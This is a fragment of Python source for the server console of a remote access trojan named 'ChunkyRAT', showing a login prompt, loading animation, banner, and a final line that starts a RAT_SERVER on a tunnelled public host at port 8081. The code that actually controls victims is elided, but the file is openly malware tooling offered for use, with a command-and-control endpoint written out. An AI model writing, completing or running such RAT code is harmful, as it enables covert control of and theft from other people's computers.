import random
import socket, os
import time          # shit imported


ratversion = 0.01

# -----------------------
def clear_console():           # Sets up design stuff :P
    os.system('cls')
# -----------------------
...
while logged == False:
    ...
    if userlogin == login:
        logged = True
        print("Logged In!")
        print("Thank you for using ChunkyRAT | " + str(ratversion))
        time.sleep(2)
        clear_console()
    else:
        print("wrong login")
...
load_string = ["Initializing |", "Initializing /", "Initializing -", "Initializing \ ", "Initializing |", "Initializing /", "Initializing -", "Initializing \ "]

clear_console()
for x in load_string:
    print(x)
    time.sleep(0.2)               # design
    clear_console()

print("+-+-+-+-+-+-+-+-+-+-+")
print("|C|h|u|n|k|y|*|R|a|t|")
print("+-+-+-+-+-+-+-+-+-+-+")
print("           by d0t | " + str(ratversion) + " | Server")

'''  ----------------------------------------------
'''

rat = RAT_SERVER('https://chunkyrat-d0tmaxx.p.tnnl.in', 8081)
